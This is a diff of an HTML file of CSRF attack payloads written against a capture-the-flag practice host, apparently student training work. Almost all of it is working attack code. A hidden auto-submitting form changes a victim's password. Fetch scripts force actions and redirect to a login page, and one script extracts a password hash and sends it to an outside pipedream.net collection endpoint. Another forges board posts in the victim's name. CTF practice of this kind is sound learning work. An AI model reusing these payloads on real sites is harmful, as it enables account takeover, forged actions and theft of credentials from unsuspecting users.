@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<iframe width="0" height="0" frameborder="0" name="stealthcsrf" id="stealthcsrf" style="display: none"></iframe>
-<body onload="document.forms[0].submit()">
-    <div width="0" height="0" style="display: none">
-        <form method="post" action="http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php" target="stealthcsrf">
-            <input name="pw" type="hidden" value="csrf" />
-            <input type="submit" value="Update" />
-        </form>
-    </div>
-</body>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <iframe width="0" height="0" frameborder="0" name="stealthcsrf" id="stealthcsrf" style="display: none"></iframe>
+    <body onload="document.forms[0].submit()">
+        <div width="0" height="0" style="display: none">
+            <form method="post" action="http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php" target="stealthcsrf">
+                <input name="pw" type="hidden" value="csrf" />
+                <input type="submit" value="Update" />
+            </form>
+        </div>
+    </body>
 </html>
 
 <!-- 1차 프로젝트 CSRF -->
@@ -22,7 +22,7 @@
         try {
             let url = "http://ctf.segfaulthub.com:5004/study/board_like_ok.php?idx=496";
             let response = await fetch(url);
-            document.location.href="http://ctf.segfaulthub.com:5004/file/upload/login.html";
+            document.location.href = "http://ctf.segfaulthub.com:5004/file/upload/login.html";
         } catch (error) {
             let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net?error=" + error;
             await fetch(attackerUrl);
@@ -64,9 +64,10 @@
         let sex = "남";
         let email = "test@naver.com";
         let attackerUrl = "http://ctf.segfaulthub.com:5005/login case 1/board/mypage_mod_ok.php";
-        let resp = await fetch(attackerUrl, { 
-            method: "POST", 
-            body: new URLSearchParams({ userid, pw, name, adress, sex, email }) });
+        let resp = await fetch(attackerUrl, {
+            method: "POST",
+            body: new URLSearchParams({ userid, pw, name, adress, sex, email }),
+        });
         if (resp.ok) {
             await fetch("https://eobws14x5y95evd.m.pipedream.net/?result=succuess");
         }
@@ -74,6 +75,49 @@
     csrfExploit();
 </script>
 
+<!--3차 프로젝트 CSRF 해시 탈취 -->
+<script>
+    async function csrfExploit() {
+        let url = `http://ctf.segfaulthub.com:9191/2_main_page.php`;
+        let response = await fetch(url);
+        let html = await response.text();
+        let parser = new DOMParser();
+        let dom = parser.parseFromString(html, `text/html`);
+        let div = dom.querySelector(`div`);
+        let inputString = div.outerHTML;
+        let regex = /비밀번호 :  : ([a-f0-9]+)/; // 해시 추출
+        let match = inputString.match(regex);
+        if (match && match[1]) {
+            let extractedValue = match[1];
+            let attackerurl = `https://eobws14x5y95evd.m.pipedream.net?hash=`.concat(extractedValue);
+            await fetch(attackerurl);
+        }
+    }
+    csrfExploit();
+</script>
 
-
-
+<!--3차 프로젝트 CSRF -->
+<script>
+    async function csrfExploit() {
+        let url = `http://ctf.segfaulthub.com:9191/2_main_page.php`;
+        let response = await fetch(url);
+        let html = await response.text();
+        let parser = new DOMParser();
+        let dom = parser.parseFromString(html, `text/html`);
+        let div = dom.querySelector(`div`);
+        let inputString = div.outerHTML;
+        let regex = /<h1>(.*?)님\s환영합니다\.<\/h1>/i;
+        let match = inputString.match(regex);
+        if (match && match[1]) {
+            let extractedValue = match[1];
+            let writeform = new FormData();
+            writeform.append("name", extractedValue);
+            writeform.append("subject", "CSRF 공격");
+            writeform.append("memo", "CSRF 공격");
+            writeform.append("MAX_FILE_SIZE", "30000");
+            writeform.append("file", "upload");
+            writeform.append("pwd", "1234");
+            await fetch(`http://ctf.segfaulthub.com:9191/writePost.php`, { method: "POST", body: writeform });
+        }
+    }
+</script>
